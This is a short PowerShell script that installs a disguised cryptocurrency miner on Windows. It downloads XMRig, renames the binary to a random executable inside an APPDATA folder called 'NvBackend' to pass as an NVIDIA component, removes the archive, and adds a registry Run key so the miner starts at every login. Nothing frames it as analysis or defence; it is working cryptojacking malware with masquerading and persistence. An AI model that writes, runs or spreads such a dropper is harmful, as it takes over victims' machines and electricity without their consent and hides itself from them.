$APP  = "$env:APPDATA\NvBackend"
$PCID = "$APP\pcid.txt"
$EXE  = "$APP\$((New-Guid).ToString('N').Substring(0,8)).exe"

New-Item -ItemType Directory -Path $APP -Force | Out-Null
if (-not (Test-Path $PCID)) { Set-Content $PCID (Get-Random -Minimum 10000000 -Maximum 99999999) }

# download xmrig if missing
if (-not (Test-Path $EXE)) {
    Invoke-WebRequest "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-win64.zip" -OutFile "$APP\x.zip"
    Expand-Archive "$APP\x.zip" $APP -Force
    Move-Item "$APP\xmrig.exe" $EXE
    Remove-Item "$APP\x.zip"
}

# registry Run key
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "NvBackend" -Value $EXE
